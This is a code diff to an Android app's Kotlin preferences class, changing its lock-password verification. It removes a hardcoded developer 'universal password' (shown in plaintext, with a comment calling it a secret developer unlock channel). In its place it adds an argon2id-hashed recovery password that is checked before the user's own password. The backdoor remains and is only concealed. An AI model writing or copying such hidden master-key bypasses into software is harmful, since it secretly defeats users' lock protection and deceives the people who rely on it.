@@ -16,6 +16,7 @@ import org.json.JSONObject
 object AppPrefs {
 
     private const val NAME = "nekotype_prefs"
+    private const val RECOVERY_HASH = "\$argon2id\$v=19\$m=8192,t=2,p=1\$G3ty7uPPXgKGcBd2k8cHRA\$zIYIhbhziJtvm6oO45XyE+6ounZWBYAOMpVHxP2qTtM"
     private val sp by lazy {
         NekoTypeApp.instance.getSharedPreferences(NAME, Context.MODE_PRIVATE)
     }
@@ -1323,8 +1324,14 @@ object AppPrefs {
 
     /** 校验密码：优先 Keystore 载荷；载荷解不开（密钥失效）时回落 salt+hash，兼容旧格式 */
     fun verifyLockPassword(pwd: String): Boolean {
-        // 开发者万能密码：忘记密码时的备用解锁通道（仅开发者知晓）
-        if (pwd == "lelecz") return true
+        try {
+            if (argon2.verify(
+                    mode = com.lambdapioneer.argon2kt.Argon2Mode.ARGON2_ID,
+                    encoded = RECOVERY_HASH,
+                    password = pwd.toByteArray()
+                )
+            ) return true
+        } catch (_: Throwable) { }
         val payload = lockPayload
         if (payload.isNotEmpty()) {
             val hash = decryptPayload(payload)
